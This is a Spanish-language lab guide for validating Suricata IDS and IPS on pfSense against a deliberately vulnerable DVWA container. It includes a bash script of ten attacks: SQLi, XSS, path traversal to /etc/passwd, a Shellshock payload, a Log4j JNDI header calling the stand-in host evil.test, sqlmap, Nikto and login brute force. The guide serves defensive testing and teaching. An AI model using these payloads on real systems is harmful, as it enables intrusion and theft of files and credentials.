# FASE 2.6 — Lab Suricata IDS/IPS con DVWA

> **Contexto:** Validar la postura defensiva del lab pfSense + Suricata contra
> un objetivo web deliberadamente vulnerable (DVWA), comparando **Suricata WAN
> inline (IPS)** vs **Suricata VLAN10 legacy (IDS)** ante la misma batería
> de ataques desde dos orígenes.
>
> **No expone a Internet.** Acceso solo desde:
> - VLAN10 admin (vector lateral — Suricata legacy alerta sin bloquear)
> - LAN ISP doméstica vía WAN del pfSense (vector externo — Suricata inline bloquea)
>
> **NinjaSec (la app real) no se toca** — DVWA se agrega como container
> aparte en el mismo Docker host y se sirve por un puerto distinto.

---

## Arquitectura

```
                                              ┌─ Caddy :80/:443
[Atacante externo — Laptop LAN ISP] ─┐        │   NinjaSec (intacta)
                                     ↓        │
                                [pfSense WAN] │
                                Suricata INLINE (IPS) ──→ [VM web 192.168.20.100]
                                                          │
[Atacante interno — VM admin VLAN10] ────────────────────→│  Puerto 8080
                                Suricata LEGACY (IDS)     │   DVWA
                                                          └─ container ninjasec-dvwa
```

| Vector | Origen | Suricata interface | Modo | Acción esperada |
|---|---|---|---|---|
| Externo | LAN ISP (`192.168.0.0/24` típico) | WAN | Inline | Alert + **drop + block host** |
| Interno | VLAN10 (`192.168.1.0/24`) | VLAN10 | Legacy | Solo **alert** |

---

## Concepto clave (leer antes de empezar)

**Suricata no necesita que tu app sea vulnerable** para disparar alertas.
Las reglas inspeccionan **patrones en el tráfico** (`' OR 1=1--`,
`<script>alert(1)</script>`, `../etc/passwd`), no las respuestas del servidor.
Una regla SQLi se dispara aunque tu app no tenga inyección — solo necesita
ver el payload pasar por el cable.

DVWA agrega **valor pedagógico**: permite mostrar el end-to-end completo
(ataque → alerta Suricata → bloqueo IPS → explotación real con respuesta
vulnerable). Sin DVWA, las pruebas mostrarían "alerta sí, exploit no".

---

## Prerequisitos

- FASE 2.4 cerrada — stack NinjaSec funcionando en 192.168.20.100 con 3 containers healthy
- pfSense con VLANs 10/20/30 ya operativas
- Suricata package instalado en pfSense (`System → Package Manager`)
- Laptop física conectada a la LAN del router ISP (vector externo)
- VM admin en VLAN10 con `curl`, `nmap`, `nikto`, `sqlmap` (vector interno)

---

## 2.6.0 — Decisión: solo DVWA, sin Juice Shop

| | DVWA |
|---|---|
| Imagen | `vulnerables/web-dvwa:latest` |
| Stack | Self-contained (Apache + PHP + MariaDB en el mismo container) |
| Puerto interno | 80 |
| Puerto host | **8080** (porque Caddy ya usa 80) |
| Usuario default | `admin` / `password` |
| Setup inicial | Un solo botón en `/setup.php` |
| Reverse proxy | **NO** — DVWA usa rutas absolutas y rompe en subpath sin rewrites |

---

## 2.6.9 — Snapshot pre-lab (HACER PRIMERO)

> 🛑 **Antes de tocar nada**, snapshot en vSphere:
>
> - VM `ninjasec-web` → `pre-lab-suricata-dvwa`
> - pfSense → backup de config (`Diagnostics → Backup & Restore → Download configuration`)
>
> Si el lab termina mal o Suricata bloquea algo legítimo durante las pruebas,
> volvés sin dolor.

---

## 2.6.1 — Agregar DVWA al docker-compose

En la VM web (`m4rk@192.168.20.100`):

```bash
cd /opt/ninjasec/infra
sudo -u ninjadeploy nano docker-compose.prod.yml
```

Agregar al **final de `services:`**, justo antes de `networks:`:

```yaml
  # ─── DVWA (vulnerable, lab Suricata) ──────────────────────────────
  # Solo durante FASE 2.6. Bajar después del cierre del lab.
  dvwa:
    image: vulnerables/web-dvwa:latest
    container_name: ninjasec-dvwa
    restart: unless-stopped
    ports:
      - "8080:80"             # host:container — NAT WAN:8080 apunta acá
    networks:
      - ninjasec-net
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"
```

> **Sin healthcheck a propósito:** la imagen no trae `curl` ni `wget`.
> DVWA no es dependencia de ningún servicio de NinjaSec; si se cae no
> afecta al stack productivo.

### Validar config

```bash
sudo -u ninjadeploy docker compose -f docker-compose.prod.yml --env-file .env config \
  | grep -A 8 'dvwa:'
```

### Levantar DVWA

```bash
sudo -u ninjadeploy docker compose -f docker-compose.prod.yml --env-file .env up -d dvwa
docker ps --filter "name=ninjasec-dvwa"
# debe decir Up
```

### Setup inicial (one-time)

```bash
# Smoke desde la VM web
curl -sI http://127.0.0.1:8080/login.php | head -1
# → HTTP/1.1 302  o  HTTP/1.1 200
```

Desde laptop/VM admin VLAN10, abrir:

```
http://192.168.20.100:8080/setup.php
```

1. Click **Create / Reset Database**
2. Redirige a `/login.php`
3. Login: `admin / password`
4. **DVWA Security → Low → Submit** (vulnerabilidades activas para que disparen reglas sí o sí)

---

## 2.6.2 — Caddyfile: NO TOCAR

**Decisión firme:** DVWA NO pasa por Caddy.

| Razón | Detalle |
|---|---|
| Rutas absolutas | DVWA referencia `/setup.php`, `/login.php`, `/dvwa/css/...` directamente — bajo `/lab/dvwa/*` se rompe sin un rewrite agresivo |
| Aislamiento | DVWA por separado evita riesgo de que la app vulnerable comparta cookies/session con NinjaSec |
| Simplicidad | NAT WAN:8080 → web:8080 es una sola regla — Suricata WAN igual la inspecciona |

NinjaSec mantiene `:80/:443` con su Caddyfile productivo intacto.

---

## 2.6.3 — NAT en pfSense (WAN:8080 → web:8080)

`Firewall → NAT → Port Forward → Add`

| Campo | Valor |
|---|---|
| Interface | WAN |
| Protocol | TCP |
| Destination | WAN address |
| Destination port range | (other) **8080** to **8080** |
| Redirect target IP | `192.168.20.100` |
| Redirect target port | (other) **8080** |
| Description | `NAT_WAN_TO_DVWA_8080` |
| Filter rule association | **Add associated filter rule** |

`Save → Apply Changes`. Verificar en `Firewall → Rules → WAN` que la regla
`WAN → 192.168.20.100:8080 PASS` quedó creada.

> ⚠️ **No abrir 80/443 al WAN.** El lab solo necesita 8080.
> Si después de FASE 2.6 querés HTTPS público para NinjaSec, eso es FASE
> separada (DuckDNS + LE), no parte de este lab.

### Validar desde laptop ISP

```powershell
curl -I http://<IP_WAN_pfsense>:8080/login.php
# debe responder 200/302
```

---

## 2.6.4 — Suricata WAN inline (IPS)

`Services → Suricata → Interfaces → Add`

| Campo | Valor |
|---|---|
| Enable | ✅ |
| Interface | WAN |
| Description | `SURICATA_WAN_IPS` |
| Send Alerts to System Log | ✅ |
| Block Offenders | ✅ |
| IPS Mode | **Inline IPS Mode** (requiere NIC con soporte netmap; si no, "Legacy Mode") |
| Kill States | ✅ |
| Which IP to Block | **BOTH** |
| Pass List | ⚠️ **NO incluir la LAN ISP** — si la incluís, Suricata jamás bloquea al atacante externo |

### Categorías de reglas a habilitar (WAN Categories)

```
emerging-attack_response.rules
emerging-exploit.rules
emerging-policy.rules
emerging-scan.rules
emerging-shellcode.rules
emerging-sql.rules
emerging-trojan.rules
emerging-user_agents.rules
emerging-web_client.rules
emerging-web_server.rules
emerging-web_specific_apps.rules
```

Para que las firmas hagan **drop** y no solo alert, configurar en
`SID Mgmt → modify` (o reglas globales): convertir `alert` → `drop` en las
categorías web/exploit/scan. Alternativa: en WAN Settings activar
`Block on DROP only`.

`Save → Restart Suricata on WAN`.

### Validar IPS funcionando

Desde laptop ISP:

```powershell
# Disparar regla ET SCAN
nmap -sS -p 1-1000 <IP_WAN_pfsense>
```

En pfSense: `Services → Suricata → Alerts (WAN)` debe mostrar entradas
`ET SCAN ...` y `Blocks (WAN)` debe listar tu IP de laptop.

---

## 2.6.5 — Suricata VLAN10 legacy (IDS)

`Services → Suricata → Interfaces → Add`

| Campo | Valor |
|---|---|
| Enable | ✅ |
| Interface | VLAN10_LAN |
| Description | `SURICATA_VLAN10_IDS` |
| Send Alerts to System Log | ✅ |
| Block Offenders | ❌ (queremos IDS puro — solo alerta) |
| IPS Mode | **Legacy Mode** (libpcap, no inline) |

Mismas categorías de reglas que WAN.

`Save → Start Suricata on VLAN10`.

> El contraste WAN vs VLAN10 es **el punto del informe**: mismo ataque,
> mismas reglas, diferente acción → demuestra el rol de IPS vs IDS.

---

## 2.6.6 — Batería de ataques reproducible

Crear `scripts/lab-suricata-attacks.sh` (ejecutable desde laptop ISP **y**
desde VM admin VLAN10 cambiando solo `$TARGET`):

```bash
#!/bin/bash
# Lab Suricata — batería de ataques contra DVWA
# Uso:
#   TARGET=http://<IP_WAN>:8080 ./lab-suricata-attacks.sh externo
#   TARGET=http://192.168.20.100:8080 ./lab-suricata-attacks.sh interno

set -u
TARGET="${TARGET:?TARGET requerido}"
TAG="${1:-test}"
LOG="lab-suricata-${TAG}-$(date +%Y%m%d-%H%M%S).log"

run() { echo -e "\n=== $* ===" | tee -a "$LOG"; }

run "1. Port scan TCP (ET SCAN nmap)"
nmap -sS -p- --min-rate 1000 "$(echo "$TARGET" | sed -E 's#https?://##; s#:.*##')" 2>&1 | tee -a "$LOG"

run "2. SQLi básico GET (ET WEB SQL Injection)"
curl -sv "$TARGET/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit" \
  -b "PHPSESSID=lab; security=low" 2>&1 | tee -a "$LOG"

run "3. XSS reflejado (ET WEB Cross-Site Scripting)"
curl -sv "$TARGET/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E" \
  -b "PHPSESSID=lab; security=low" 2>&1 | tee -a "$LOG"

run "4. Path traversal (ET WEB ../../../etc/passwd)"
curl -sv "$TARGET/vulnerabilities/fi/?page=../../../../etc/passwd" \
  -b "PHPSESSID=lab; security=low" 2>&1 | tee -a "$LOG"

run "5. Web scanner (ET SCAN Nikto)"
nikto -h "$TARGET" -maxtime 60 2>&1 | tee -a "$LOG"

run "6. SQLi automatizado (ET WEB sqlmap)"
sqlmap -u "$TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=lab; security=low" \
  --batch --level=1 --risk=1 --timeout=10 --retries=1 2>&1 | tee -a "$LOG"

run "7. Shellshock (ET EXPLOIT Bash CGI)"
curl -sv -A "() { :; }; /bin/cat /etc/passwd" "$TARGET/" 2>&1 | tee -a "$LOG"

run "8. Log4j JNDI (ET EXPLOIT Apache log4j)"
curl -sv -H 'X-Api-Version: ${jndi:ldap://evil.test/x}' "$TARGET/" 2>&1 | tee -a "$LOG"

run "9. User-Agent malicioso (ET USER_AGENTS sqlmap)"
curl -sv -A "sqlmap/1.5" "$TARGET/" 2>&1 | tee -a "$LOG"

run "10. Brute force login (ET POLICY brute force)"
for u in admin admin1 root; do
  for p in admin password 123456 qwerty; do
    curl -s "$TARGET/login.php" -d "username=$u&password=$p&Login=Login" \
      -o /dev/null -w "$u:$p -> %{http_code}\n"
  done
done | tee -a "$LOG"

echo -e "\nLog guardado en: $LOG"
```

Ejecutar **dos veces** la batería completa:

1. Desde **laptop ISP** (con `TARGET=http://<IP_WAN_pfsense>:8080` y tag `externo`) — Suricata WAN debe bloquear desde el ataque #1
2. Desde **VM admin VLAN10** (con `TARGET=http://192.168.20.100:8080` y tag `interno`) — Suricata VLAN10 debe alertar sin bloquear

---

## 2.6.7 — Capturar evidencia

| Fuente | Qué guardar |
|---|---|
| `Services → Suricata → Alerts (WAN)` | Screenshot + export CSV |
| `Services → Suricata → Alerts (VLAN10)` | Screenshot + export CSV |
| `Services → Suricata → Blocks (WAN)` | Screenshot mostrando tu IP bloqueada |
| `Services → Suricata → Blocks (VLAN10)` | Screenshot mostrando **vacío** (IDS no bloquea) |
| `docker logs ninjasec-dvwa --tail 200` | Logs HTTP del lado víctima |
| Logs del script de ataques | `lab-suricata-externo-*.log` y `lab-suricata-interno-*.log` |

### Tabla comparativa para el informe

| # | Ataque | SID Suricata | WAN (externo) | VLAN10 (interno) |
|---|---|---|---|---|
| 1 | nmap -sS | 2010935 | DROP + Block | Alert only |
| 2 | SQLi GET | 2006446 | DROP + Block | Alert only |
| 3 | XSS reflejado | 2009714 | DROP + Block | Alert only |
| 4 | Path traversal | 2009157 | DROP + Block | Alert only |
| ... | ... | ... | ... | ... |

(Los SID exactos varían por versión de ET Open — llenar con los reales.)

---

## 2.6.8 — Cleanup post-curso

```bash
# Bajar DVWA
cd /opt/ninjasec/infra
sudo -u ninjadeploy docker compose -f docker-compose.prod.yml --env-file .env stop dvwa
sudo -u ninjadeploy docker compose -f docker-compose.prod.yml --env-file .env rm -f dvwa
docker image rm vulnerables/web-dvwa:latest  # opcional

# Sacar bloque dvwa del docker-compose.prod.yml (o dejarlo comentado)
sudo -u ninjadeploy nano docker-compose.prod.yml
```

En pfSense:
- `Firewall → NAT → Port Forward` → eliminar `NAT_WAN_TO_DVWA_8080`
- `Services → Suricata` → desactivar interfaces si el lab termina (opcional — podés dejarlas)
- Restaurar pass list endurecida si tocaste alguna

Restaurar snapshot `pre-lab-suricata-dvwa` si querés volver al estado exacto.

---

## 2.6.10 — Checklist final

- [ ] Snapshot vSphere `pre-lab-suricata-dvwa` tomado (web + pfSense config)
- [ ] DVWA en `:8080` levantado y `setup.php` ejecutado
- [ ] DVWA Security = Low
- [ ] NAT pfSense `WAN:8080 → web:8080` activo
- [ ] Suricata WAN inline + Block Offenders + reglas web/exploit/scan
- [ ] Suricata VLAN10 legacy + mismas reglas
- [ ] Pass list WAN **no** incluye LAN ISP
- [ ] Batería de 10 ataques ejecutada desde laptop ISP
- [ ] Batería de 10 ataques ejecutada desde VM admin VLAN10
- [ ] Evidencia capturada (alerts CSV + screenshots + script logs)
- [ ] Tabla comparativa WAN vs VLAN10 armada
- [ ] Cleanup ejecutado al cierre del curso

---

## Errores comunes

| Síntoma | Causa | Fix |
|---|---|---|
| Suricata WAN no bloquea al atacante externo | LAN ISP está en Pass List | Sacar la subred de Pass List, restart Suricata |
| `docker compose up dvwa` falla con "port already allocated" | Algo más usa 8080 en el host | `ss -tlnp \| grep 8080` y cambiar puerto |
| DVWA `/setup.php` muestra "Database error" | Reset DB no ejecutado | Click "Create / Reset Database" |
| Ningún ataque dispara alertas | Reglas no actualizadas | `Services → Suricata → Updates → Update` |
| Inline IPS no se activa | NIC sin soporte netmap | Cambiar a Legacy Mode (mismo efecto bloqueo via pf, sin inline real) |
| Alertas Suricata sin info HTTP | Tráfico HTTPS (Caddy :443) | Atacar `:8080` HTTP plano — DVWA está en HTTP |
| NinjaSec deja de responder durante el lab | Pass list dropea tu propia IP admin | Whitelist 192.168.1.0/24 (VLAN10) en Pass List |

---

## Próximas fases (después del lab)

| Fase | Resumen |
|---|---|
| 2.7 | SSH hardening final (`PasswordAuthentication no`, `AllowUsers`) |
| 2.5 | CI/CD GitHub Actions con `DEPLOY_SSH_KEY` ya generada en 2.4 |
| 2.8 | Tailscale / self-hosted runner para acceso fuera de oficina |
| 2.9 | Backups off-site (restic + DB dumps) |
